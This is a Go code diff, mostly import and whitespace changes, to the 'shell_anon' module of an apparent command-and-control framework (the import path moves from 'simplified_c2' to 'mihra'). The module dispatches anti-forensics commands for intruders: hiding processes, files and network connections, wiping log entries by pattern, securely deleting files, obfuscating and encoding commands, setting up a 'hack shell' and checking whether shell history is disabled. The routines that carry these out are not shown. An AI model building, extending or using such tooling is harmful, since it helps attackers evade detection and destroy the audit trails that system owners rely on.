@@ -1,10 +1,13 @@
 package shell_anon
+
 import (
 	"fmt"
 	"os"
 	"runtime"
-	"github.com/simplified_c2/module"
+
+	"github.com/0xvyper/mihra/module"
 )
+
 type Module struct {
 	Name          string
 	Version       string
@@ -16,6 +19,7 @@ type Module struct {
 	networkHider  *NetworkHider
 	cmdObfuscator *CommandObfuscator
 }
+
 func NewModule() *Module {
 	return &Module{
 		Name:          "shell_anon",
@@ -94,7 +98,7 @@ func (m *Module) GetInfo() *module.ModuleInfo {
 				Name:        "get_tips",
 				Description: "Get anonymization tips",
 				Usage:       "get_tips <category>",
-				Options:     map[string]string{
+				Options: map[string]string{
 					"category": "command|process|file|network|all",
 				},
 			},
@@ -117,14 +121,14 @@ func (m *Module) ExecuteCommand(command string, args []string) (interface{}, err
 	switch command {
 	case "setup":
 		return "Shell environment secured", m.anonymizer.SetupHackShell()
-		
+
 	case "generate_script":
 		if len(args) < 1 {
 			return nil, fmt.Errorf("missing output path")
 		}
 		script := m.anonymizer.GenerateHackShellScript()
 		return "Script generated", os.WriteFile(args[0], []byte(script), 0755)
-		
+
 	case "hide_process":
 		if len(args) < 2 {
 			return nil, fmt.Errorf("missing pid or new name")
@@ -135,37 +139,37 @@ func (m *Module) ExecuteCommand(command string, args []string) (interface{}, err
 			return nil, fmt.Errorf("invalid pid")
 		}
 		return "Process hidden", m.processHider.HideProcess(pid, args[1])
-		
+
 	case "hide_file":
 		if len(args) < 1 {
 			return nil, fmt.Errorf("missing file path")
 		}
 		return "File hidden", m.fileHider.HideFile(args[0])
-		
+
 	case "clean_log":
 		if len(args) < 2 {
 			return nil, fmt.Errorf("missing log path or pattern")
 		}
 		return "Log cleaned", m.fileHider.CleanLogFile(args[0], args[1])
-		
+
 	case "secure_delete":
 		if len(args) < 1 {
 			return nil, fmt.Errorf("missing file path")
 		}
 		return "File securely deleted", m.fileHider.SecureDelete(args[0])
-		
+
 	case "obfuscate_command":
 		if len(args) < 1 {
 			return nil, fmt.Errorf("missing command")
 		}
 		return m.cmdObfuscator.ObfuscateCommand(args[0]), nil
-		
+
 	case "encode_command":
 		if len(args) < 1 {
 			return nil, fmt.Errorf("missing command")
 		}
 		return m.cmdObfuscator.EncodeCommand(args[0]), nil
-		
+
 	case "hide_connection":
 		if len(args) < 1 {
 			return nil, fmt.Errorf("missing port")
@@ -176,13 +180,13 @@ func (m *Module) ExecuteCommand(command string, args []string) (interface{}, err
 			return nil, fmt.Errorf("invalid port")
 		}
 		return "Connection hidden", m.networkHider.HideConnection(port)
-		
+
 	case "get_tips":
 		category := "all"
 		if len(args) > 0 {
 			category = args[0]
 		}
-		
+
 		var tips []string
 		switch category {
 		case "command":
@@ -201,25 +205,22 @@ func (m *Module) ExecuteCommand(command string, args []string) (interface{}, err
 		default:
 			return nil, fmt.Errorf("invalid category: %s", category)
 		}
-		
+
 		return tips, nil
-		
+
 	case "status":
 		status := make(map[string]interface{})
-		
-		
+
 		histFile := os.Getenv("HISTFILE")
 		status["history_disabled"] = (histFile == "/dev/null" || histFile == "")
-		
-		
+
 		status["process_hiding_supported"] = (runtime.GOOS == "linux")
-		
-		
+
 		tmpDir := os.Getenv("TMPDIR")
 		status["secure_tmpdir"] = (tmpDir == "/dev/shm")
-		
+
 		return status, nil
-		
+
 	default:
 		return nil, fmt.Errorf("unknown command: %s", command)
 	}
@@ -272,38 +273,34 @@ func (m *Module) EncodeCommand(command string) string {
 }
 func (m *Module) GetAnonymizationStatus() map[string]interface{} {
 	status := make(map[string]interface{})
-	
-	
+
 	histFile := os.Getenv("HISTFILE")
 	status["history_disabled"] = (histFile == "/dev/null" || histFile == "")
-	
-	
+
 	status["process_hiding_supported"] = (runtime.GOOS == "linux")
-	
-	
+
 	tmpDir := os.Getenv("TMPDIR")
 	status["secure_tmpdir"] = (tmpDir == "/dev/shm")
-	
+
 	return status
 }
 func (m *Module) ApplyFullAnonymization() error {
-	
+
 	if err := m.SetupHackShell(); err != nil {
 		return fmt.Errorf("failed to setup hack shell: %v", err)
 	}
-	
-	
+
 	if runtime.GOOS == "linux" {
 		if err := m.HideCurrentProcess("bash"); err != nil {
-			
+
 			fmt.Printf("Warning: failed to hide current process: %v\n", err)
 		}
-		
+
 		if err := m.HideFromPS(); err != nil {
-			
+
 			fmt.Printf("Warning: failed to hide from ps: %v\n", err)
 		}
 	}
-	
+
 	return nil
 }
